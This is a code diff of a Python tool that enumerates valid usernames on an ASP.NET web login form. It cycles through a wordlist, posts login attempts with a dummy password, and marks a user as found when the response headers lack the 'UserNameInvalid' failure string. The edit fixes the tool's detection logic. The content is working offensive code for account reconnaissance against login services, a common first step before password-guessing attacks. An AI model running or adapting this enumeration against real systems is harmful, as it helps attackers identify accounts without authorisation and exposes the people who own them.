@@ -63,14 +63,16 @@ def process_enum(queue, found_queue, wordlist, url, payload, failstr, verbose, p
 
             req = requests.request('POST',url,headers=headers,data=dataraw, proxies=proxies)
 
-            x = "".join('{}: {}'.format(k, v) for k, v in req.headers.items())
+            x = " ".join('{}: {}'.format(k, v) for k, v in req.headers.items())             
+            
+            match = re.search(r"{}".format(failstr), str(x).replace('\n','').replace('\r',''))
 
-            if re.search(r"{}".format(failstr), str(x).replace('\n','').replace('\r','')):
+            if not match:
                 queue.put((proc_id, "FOUND", user))
                 found_queue.put((proc_id, "FOUND", user))
                 if stop: break
             elif verbose:
-                queue.put((proc_id, "TRIED", user))
+                queue.put((proc_id, "TRIED", user))      
             queue.put(("PERCENT", proc_id, (counter/total)*100))
 
     except (urlexcept.NewConnectionError, requests.exceptions.ConnectionError):
@@ -91,10 +93,10 @@ if __name__ == "__main__":
     # Arguments to simple variables
     wordlist = args.wordlist
     url = args.url
-    payload = ['ctl00%24Main%24userNameBox:{USER}', 'ctl00%24Main%24passwordBox:a', 'ctl00%24Main%24ctl05:Login', '__EVENTTARGET:', '__EVENTARGUMENT:', '__VIEWSTATE:']
+    payload = ['ctl00%24Main%24userNameBox:{USER}', 'ctl00%24Main%24passwordBox:dummy', 'ctl00%24Main%24ctl05:Login', '__EVENTTARGET:', '__EVENTARGUMENT:', '__VIEWSTATE:']
     verbose = args.v
     thread_count = args.c
-    failstr = "PasswordInvalid"
+    failstr = "UserNameInvalid"
     stop = args.s
     proxy= args.p
 
